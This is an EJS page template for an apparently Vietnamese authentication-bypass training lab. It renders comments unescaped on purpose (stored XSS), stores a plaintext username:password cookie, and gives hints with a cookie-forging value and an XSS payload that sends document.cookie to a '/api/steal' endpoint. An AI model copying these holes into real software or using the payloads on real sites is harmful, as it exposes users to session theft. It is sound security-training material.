<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentication Bypass Lab</title>
    <link rel="stylesheet" href="/css/style.css">
</head>

<body>
    <div class="container">
        <header>
            <a href="/" class="back-link">‚Üê Quay l·∫°i</a>
            <h1>üîì Authentication Bypass Lab</h1>
            <p class="subtitle">Th·ª±c h√†nh k·ªπ thu·∫≠t v∆∞·ª£t qua x√°c th·ª±c</p>
        </header>

        <main class="lab-content">
            <div class="info-box">
                <h3>üìã M·ª•c ti√™u</h3>
                <ul>
                    <li>ƒêƒÉng nh·∫≠p v√†o h·ªá th·ªëng v·ªõi t√†i kho·∫£n h·ª£p l·ªá</li>
                    <li>Ph√°t hi·ªán l·ªó h·ªïng trong c√°ch l∆∞u cookie x√°c th·ª±c</li>
                    <li>Bypass authentication ƒë·ªÉ ƒëƒÉng nh·∫≠p v·ªõi t√†i kho·∫£n admin</li>
                    <li>ƒê·ªçc comment b√≠ m·∫≠t c·ªßa admin</li>
                </ul>
            </div>

            <% if (!authenticated) { %>
                <!-- Login Form -->
                <div class="auth-section">
                    <h2>ƒêƒÉng Nh·∫≠p</h2>
                    <div class="login-box">
                        <form id="loginForm">
                            <div class="form-group">
                                <label for="username">T√™n ƒëƒÉng nh·∫≠p:</label>
                                <input type="text" id="username" name="username" placeholder="Nh·∫≠p username" required />
                            </div>
                            <div class="form-group">
                                <label for="password">M·∫≠t kh·∫©u:</label>
                                <input type="password" id="password" name="password" placeholder="Nh·∫≠p password"
                                    required />
                            </div>
                            <button type="submit" class="btn">üîê ƒêƒÉng nh·∫≠p</button>
                        </form>
                        <div id="loginMessage"></div>
                    </div>

                    <div class="credentials-hint">
                        <h4>üí° T√†i kho·∫£n test:</h4>
                        <p><code>user1 / password1</code></p>
                        <p><code>user2 / password2</code></p>
                        <p style="color: #999; font-size: 0.9em;">T√†i kho·∫£n admin: ??? (T·ª± t√¨m hi·ªÉu)</p>
                    </div>
                </div>
                <% } else { %>
                    <!-- Authenticated Area -->
                    <div class="auth-section">
                        <div class="welcome-box">
                            <h2>Ch√†o m·ª´ng, <%= username %>!</h2>
                            <p>B·∫°n ƒë√£ ƒëƒÉng nh·∫≠p th√†nh c√¥ng v√†o h·ªá th·ªëng.</p>
                            <button id="logoutBtn" class="btn btn-secondary">üö™ ƒêƒÉng xu·∫•t</button>
                        </div>

                        <!-- Comments Section -->
                        <div class="comments-section">
                            <h2>üí¨ B·∫£ng Tin</h2>

                            <div class="comment-form">
                                <textarea id="commentInput" placeholder="Vi·∫øt comment c·ªßa b·∫°n..." rows="3"></textarea>
                                <button id="postCommentBtn" class="btn">üìù G·ª≠i Comment</button>
                            </div>

                            <div id="commentsList" class="comments-list">
                                <% comments.forEach(comment=> { %>
                                    <div
                                        class="comment-item <%= comment.username === 'admin' ? 'admin-comment' : '' %>">
                                        <div class="comment-header">
                                            <strong>
                                                <%= comment.username %>
                                            </strong>
                                            <span class="comment-time">
                                                <%= new Date(comment.created_at).toLocaleString('vi-VN') %>
                                            </span>
                                        </div>
                                        <!-- KH√îNG AN TO√ÄN - Render HTML th√¥, c√≥ l·ªó h·ªïng XSS -->
                                        <div class="comment-body">
                                            <%- comment.comment %>
                                        </div>
                                    </div>
                                    <% }); %>
                            </div>
                        </div>
                    </div>
                    <% } %>

                        <div class="hints-box">
                            <h3>üí° G·ª£i √Ω</h3>
                            <details>
                                <summary>G·ª£i √Ω 1: Ki·ªÉm tra Cookie</summary>
                                <p>Sau khi ƒëƒÉng nh·∫≠p, m·ªü DevTools (F12) v√† ki·ªÉm tra tab <strong>Application >
                                        Cookies</strong></p>
                            </details>
                            <details>
                                <summary>G·ª£i √Ω 2: Ph√¢n t√≠ch Cookie</summary>
                                <p>Cookie c√≥ t√™n <code>auth</code> v·ªõi gi√° tr·ªã c√≥ d·∫°ng g√¨? C√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c kh√¥ng?</p>
                            </details>
                            <details>
                                <summary>G·ª£i √Ω 3: Gi·∫£ m·∫°o Cookie</summary>
                                <p>Th·ª≠ thay ƒë·ªïi gi√° tr·ªã cookie th√†nh <code>admin:admin123</code> trong DevTools</p>
                            </details>
                            <details>
                                <summary>G·ª£i √Ω 4: L·∫•y FLAG</summary>
                                <p>Sau khi ƒëƒÉng nh·∫≠p v·ªõi t√†i kho·∫£n admin, t√¨m comment ch·ª©a FLAG t·ª´ admin</p>
                            </details>
                            <details>
                                <summary>G·ª£i √Ω 5: Stored XSS Attack (N√¢ng cao)</summary>
                                <p>Th·ª≠ post comment v·ªõi script:
                                    <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
                            </details>
                            <details>
                                <summary>G·ª£i √Ω 6: Session Hijacking (N√¢ng cao)</summary>
                                <p>Payload ƒë·ªÉ ƒë√°nh c·∫Øp cookie c·ªßa admin:<br>
                                    <code>&lt;script&gt;fetch('/api/steal?cookie='+document.cookie)&lt;/script&gt;</code>
                                </p>
                            </details>
                        </div>

                        <div class="info-box"
                            style="background: #fff3cd; border-left-color: #ffc107; margin-top: 20px;">
                            <h3>‚ö†Ô∏è L·ªó h·ªïng</h3>
                            <ul>
                                <li><strong>Authentication:</strong> Cookie l∆∞u <code>username:password</code> d·∫°ng
                                    plaintext</li>
                                <li><strong>Cookie Security:</strong> <code>httpOnly: false</code> ‚Üí c√≥ th·ªÉ ƒë·ªçc/s·ª≠a b·∫±ng
                                    JavaScript</li>
                                <li><strong>Session:</strong> Kh√¥ng m√£ h√≥a cookie, kh√¥ng verify session</li>
                                <li><strong>XSS:</strong> Comment kh√¥ng sanitize ‚Üí Stored XSS</li>
                                <li><strong>Impact:</strong> Attacker c√≥ th·ªÉ ƒë√°nh c·∫Øp cookie c·ªßa admin</li>
                            </ul>
                        </div>
        </main>

        <footer>
            <p>‚ö†Ô∏è ƒê√¢y l√† m√¥i tr∆∞·ªùng th·ª±c h√†nh - Cookie kh√¥ng ƒë∆∞·ª£c b·∫£o m·∫≠t</p>
        </footer>
    </div>

    <script>
        // Login Form
        const loginForm = document.getElementById('loginForm');
        const loginMessage = document.getElementById('loginMessage');

        if (loginForm) {
            loginForm.addEventListener('submit', async (e) => {
                e.preventDefault();

                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;

                try {
                    const response = await fetch('/api/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ username, password })
                    });

                    const data = await response.json();

                    if (data.success) {
                        loginMessage.innerHTML = '<div class="success-box">‚úÖ ƒêƒÉng nh·∫≠p th√†nh c√¥ng! ƒêang chuy·ªÉn h∆∞·ªõng...</div>';
                        setTimeout(() => location.reload(), 1000);
                    } else {
                        loginMessage.innerHTML = `<div class="error-box">‚ùå ${data.error}</div>`;
                    }
                } catch (err) {
                    loginMessage.innerHTML = `<div class="error-box">L·ªói: ${err.message}</div>`;
                }
            });
        }

        // Logout
        const logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) {
            logoutBtn.addEventListener('click', async () => {
                await fetch('/api/logout', { method: 'POST' });
                location.reload();
            });
        }

        // Post Comment
        const postCommentBtn = document.getElementById('postCommentBtn');
        if (postCommentBtn) {
            postCommentBtn.addEventListener('click', async () => {
                const comment = document.getElementById('commentInput').value.trim();

                if (!comment) {
                    alert('Vui l√≤ng nh·∫≠p comment!');
                    return;
                }

                try {
                    const response = await fetch('/api/comment', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ comment })
                    });

                    const data = await response.json();

                    if (data.success) {
                        location.reload();
                    } else {
                        alert('L·ªói: ' + data.error);
                    }
                } catch (err) {
                    alert('L·ªói: ' + err.message);
                }
            });
        }
    </script>
</body>

</html>